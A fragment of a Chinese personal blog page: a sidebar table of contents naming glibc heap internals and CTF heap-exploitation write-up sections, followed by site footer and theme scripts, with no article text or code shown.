nav-level-5"><a class="nav-link" href="#unsortedbin"><span class="nav-number">1.4.3.5.</span> <span class="nav-text">unsortedbin</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%80%9A%E7%94%A8%E5%AE%8F"><span class="nav-number">1.4.3.6.</span> <span class="nav-text">通用宏</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#topchunk"><span class="nav-number">1.4.3.7.</span> <span class="nav-text">topchunk</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#last-remainder"><span class="nav-number">1.4.3.8.</span> <span class="nav-text">last remainder</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#binmap"><span class="nav-number">1.4.3.9.</span> <span class="nav-text">binmap</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#arena"><span class="nav-number">1.4.4.</span> <span class="nav-text">arena</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#arena%E6%95%B0%E9%87%8F"><span class="nav-number">1.4.4.1.</span> <span class="nav-text">arena数量</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#heap-info"><span class="nav-number">1.4.5.</span> <span class="nav-text">heap_info</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#malloc-state"><span class="nav-number">1.4.6.</span> <span class="nav-text">malloc_state</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03"><span class="nav-number">2.</span> <span class="nav-text">0x03</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#hitcontraining-magicheap"><span class="nav-number">2.1.</span> <span class="nav-text">hitcontraining_magicheap</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#gclibc%E4%BF%AE%E6%94%B9libc"><span class="nav-number">2.1.1.</span> <span class="nav-text">gclibc修改libc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8Bgcc%E7%89%88%E6%9C%AC-libc%E7%89%88%E6%9C%AC"><span class="nav-number">2.1.2.</span> <span class="nav-text">查看gcc版本,libc版本</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#king-in-heap-1"><span class="nav-number">2.2.</span> <span class="nav-text">king_in_heap_1</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%93IO%E6%B3%84%E9%9C%B2libc"><span class="nav-number">2.2.1.</span> <span class="nav-text">打IO泄露libc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fastbin-UAF"><span class="nav-number">2.2.2.</span> <span class="nav-text">fastbin + UAF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#double-free-%E6%8A%A5%E9%94%99%E8%B0%83%E7%94%A8-malloc-hook"><span class="nav-number">2.2.3.</span> <span class="nav-text">double free 报错调用__malloc_hook</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#king-in-heap-2"><span class="nav-number">2.3.</span> <span class="nav-text">king_in_heap_2</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#scanf%E5%AF%B9%E4%BA%8E%E5%A0%86%E7%9A%84%E5%88%A9%E7%94%A8"><span class="nav-number">2.3.1.</span> <span class="nav-text">scanf对于堆的利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#setcontext"><span class="nav-number">2.3.2.</span> <span class="nav-text">setcontext</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#note2"><span class="nav-number">2.4.</span> <span class="nav-text">note2</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#unsigned-int-0-1%E5%AF%BC%E8%87%B4%E7%9A%84%E6%97%A0%E9%99%90%E5%88%B6%E8%BE%93%E5%85%A5%E5%A0%86%E6%BA%A2%E5%87%BA"><span class="nav-number">2.4.1.</span> <span class="nav-text">(unsigned int) 0 - 1导致的无限制输入堆溢出</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#unlink%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF"><span class="nav-number">2.4.2.</span> <span class="nav-text">unlink的两种利用姿势</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hitb2018-gundam"><span class="nav-number">2.5.</span> <span class="nav-text">hitb2018_gundam</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">3.</span> <span class="nav-text"></span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="STEVE"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">STEVE</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">37</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">26</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">23</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; Mon Apr 05 2021 08:00:00 GMT+0800 (中国标准时间) – 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">STEVE</span>
</div>


    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
    <span class="post-meta-divider">|</span>
    <span id="busuanzi_container_site_uv">总访客数<span id="busuanzi_value_site_uv"></span>人</span>
    <span class="post-meta-divider">|</span>
<!-- 不蒜子计数初始值纠正 -->
<script>
$(document).ready(function() {

    var int = setInterval(fixCount, 50);  // 50ms周期检测函数
    var countOffset = 20000;  // 初始化首次数据

    function fixCount() {            
       if (document.getElementById("busuanzi_container_site_pv").style.display != "none")
        {
            $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + countOffset); 
            clearInterval(int);
        }                  
        if ($("#busuanzi_container_site_pv").css("display") != "none")
        {
            $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + countOffset); // 加上初始数据 
            clearInterval(int); // 停止检测
        }  
    }
       	
});
</script> 

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  
  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

<script>
NexT.utils.loadComments(document.querySelector('#lv-container'), () => {
  window.livereOptions = {
    refer: location.pathname.replace(CONFIG.root, '').replace('index.html', '')
  };
  (function(d, s) {
    var j, e = d.getElementsByTagName(s)[0];
    if (typeof LivereTower === 'function') { return; }
    j = d.createElement(s);
    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
    j.async = true;
    e.parentNode.insertBefore(j, e);
  })(document, 'script');
});
</script>

</body>
</html>
